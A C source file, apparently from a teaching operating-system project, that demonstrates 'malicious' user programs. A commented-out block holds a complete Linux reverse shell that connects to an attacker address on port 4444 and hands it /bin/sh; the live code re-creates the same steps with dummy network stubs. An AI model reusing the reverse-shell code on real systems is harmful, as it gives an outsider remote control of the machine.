// #include <unistd.h>
// #include <arpa/inet.h>
// #include <sys/socket.h>

// #define ATTACKER_IP "10.218.107.109" // Replace with attacker's IP
// #define ATTACKER_PORT 4444 // Replace with attacker's listener port

// int main() {
//     int sock;
//     struct sockaddr_in attacker;

//     sock = socket(AF_INET, SOCK_STREAM, 0);

//     attacker.sin_family = AF_INET;
//     attacker.sin_port = htons(ATTACKER_PORT);
//     attacker.sin_addr.s_addr = inet_addr(ATTACKER_IP);

//     connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

//     // Redirect stdin, stdout, stderr to the socket
//     dup2(sock, 0); // stdin
//     dup2(sock, 1); // stdout
//     dup2(sock, 2); // stderr

//     // Spawn a shell
//     execve("/bin/sh", NULL, NULL);

//     return 0;
// }


// #include "user.h"

// int main(void) {
//     writefile("hello.txt", "Hello from malicious app!\n", 19);
//     writefile("hello.txt", "Hello from malicious app!\n", 19);
//     writefile("hello.txt", "Hello from malicious app!\n", 19);
//     writefile("hello.txt", "Hello from malicious app!\n", 19);
//     printf("Hello World from Malicious App!\n");

//     exit();
// }


// malware_dummy.c
// Same form as reverse‐shell example, with dummy stubs instead of real network syscalls

#include "user.h"
#include "common.h"
#include <stdint.h>
#include <stddef.h>

#define ATTACKER_IP   "10.218.107.109"
#define ATTACKER_PORT 4444

// Dummy network constants
#define AF_INET      2
#define SOCK_STREAM  1


// Dummy implementations matching standard API
int socket(int domain, int type, int protocol) {
    // no real network: return a fake FD
    return 3;
}

// Convert host to network byte order (stub)
uint16_t htons(uint16_t x) {
    return (x << 8) | (x >> 8);
}

// Convert dotted-decimal to in_addr (stub)
in_addr_t inet_addr(const char *cp) {
    (void)cp;
    return 0;
}

// Execve stub: demo exit

void main(void) {
    int sock;
    struct sockaddr_in attacker;
    printf("Executing Malware!\n");

    sock = socket(AF_INET, SOCK_STREAM, 0);

    attacker.sin_family = AF_INET;
    attacker.sin_port   = htons(ATTACKER_PORT);
    attacker.sin_addr.s_addr = inet_addr(ATTACKER_IP);

    _connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

    _dup2(sock, 0); // stdin → socket
    _dup2(sock, 1); // stdout → socket
    _dup2(sock, 2); // stderr → socket

    _execve("/bin/sh", NULL, NULL);

    printf("...\n");
    printf("Attack Successful!\n");

    // fallback
    exit();
}
